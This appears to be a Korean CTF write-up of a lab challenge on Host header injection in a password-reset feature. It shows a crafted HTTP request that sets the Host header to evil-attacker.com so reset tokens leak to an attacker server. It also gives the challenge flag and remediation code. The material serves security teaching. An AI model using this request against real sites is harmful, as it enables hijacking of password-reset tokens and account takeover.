+++
title = "VulnABLE CTF [LUXORA] Write-up: Header Injection 🥉 Bronze"
description = "LUXORA 플랫폼의 기본 Header Injection을 이용한 Host 헤더 변조 및 악성 리다이렉트 롸잇업"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Header Injection", "Bronze", "Host Header", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Header Injection 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Injection Layer (Header Injection)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/header-inject/bronze`
- **목표**: 서버가 HTTP 헤더의 값을 지나치게 신뢰하는 취약점을 이용하여, 애플리케이션의 내부 로직(비밀번호 초기화 링크 등)을 조작하거나 공격자의 서버로 리다이렉트하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 반응 분석 (Reconnaissance)

`/header-inject/bronze` 경로에서 `비밀번호 찾기(Reset Password)` 기능을 실행해 봅니다.
사용자가 이메일을 입력하면, 비밀번호 재설정 링크가 포함된 메일을 전송(또는 화면에 링크 표시)하는 기능입니다.

**[정상 요청 패킷]**
```http
POST /header-inject/bronze HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded

email=user@luxora.test
```

**[정상 서버 응답 (화면 출력)]**
```html
<p>Password reset link generated:</p>
<a href="http://localhost:3000/reset?token=xyz123">Click here to reset your password</a>
```

**[해커의 사고 과정]**
1. 응답에 생성된 링크의 도메인 부분이 `http://localhost:3000` 으로 적혀 있다.
2. 서버는 이 링크의 베이스 도메인을 어떻게 알아냈을까? 십중팔구 내가 보낸 HTTP 요청의 **`Host:` 헤더**를 동적으로 읽어와서 썼을 것이다.
3. 만약 내가 이 `Host` 헤더를 해커의 도메인으로 조작해서 보낸다면?

---

## 💥 2. 취약점 식별 및 Host 헤더 조작 (Exploitation)

이른바 **Host Header Injection** 기법입니다.
Burp Suite의 Repeater를 열어 원래의 `Host: localhost:3000` 부분을 해커의 서버 주소인 `evil-attacker.com` 으로 수정합니다.

### 💡 페이로드 조립
```http
POST /header-inject/bronze HTTP/1.1
Host: evil-attacker.com
Content-Type: application/x-www-form-urlencoded

email=admin@luxora.test
```

### 🔍 조작된 서버의 응답
```html
<p>Password reset link generated:</p>
<a href="http://evil-attacker.com/reset?token=abc999">Click here to reset your password</a>
```

서버는 아무 의심 없이 해커가 주입한 `evil-attacker.com`을 사용하여 링크를 생성했습니다! 

이 링크가 `admin@luxora.test` 의 이메일로 발송되었다고 가정해 봅시다. 관리자는 "아, 우리 회사 패스워드 리셋 메일이구나" 하고 링크를 클릭할 것입니다. 클릭하는 순간 관리자의 브라우저는 해커의 서버로 이동하게 되고, URL에 포함된 중요한 `token=abc999` 값이 해커의 웹 로그에 고스란히 기록됩니다. (이를 통해 해커는 비밀번호를 강제로 바꿀 수 있습니다.)

---

## 🚀 3. 플래그 획득

이러한 Host 헤더 변조 공격이 서버 로그에 감지되면(또는 특정 조건 달성 시), 챌린지가 클리어 되며 플래그가 나타납니다.

```text
[!] System: Host Header Injection detected. Flag: FLAG{HEADER_🥉_HOST_INJECT_F1A2B3}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

HTTP 프로토콜의 특성상 클라이언트가 보내는 모든 헤더 값(Host, User-Agent, X-Forwarded-For 등)은 언제든 조작이 가능함을 악용한 대표적인 사례입니다.

**🔥 획득한 플래그:**
`FLAG{HEADER_🥉_HOST_INJECT_F1A2B3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
절대 클라이언트가 보낸 `Host` 헤더를 신뢰하여 링크나 리다이렉트 URL을 만들면 안 됩니다.

* **안전한 패치 가이드 (절대 경로 및 설정 파일 사용)**
1. **서버 사이드 설정 사용**: 애플리케이션의 베이스 URL(예: `https://www.luxora.com`)은 코드 내부나 환경 변수(`.env`)에 상수로 고정(Hardcode)해 두고 사용해야 합니다.
```javascript
// 취약한 방식 (Express.js 예시)
const resetLink = `http://${req.headers.host}/reset?token=${token}`;

// 안전한 방식
const BASE_URL = process.env.BASE_URL || 'https://www.luxora.com';
const resetLink = `${BASE_URL}/reset?token=${token}`;
```
2. **리버스 프록시 설정**: 웹 서버 앞단의 Nginx나 Apache에서, 승인되지 않은 Host 헤더를 가진 요청은 백엔드로 넘기지 말고 400 Bad Request 로 차단하도록 설정(Server Name Indication 검증)하는 것이 좋습니다.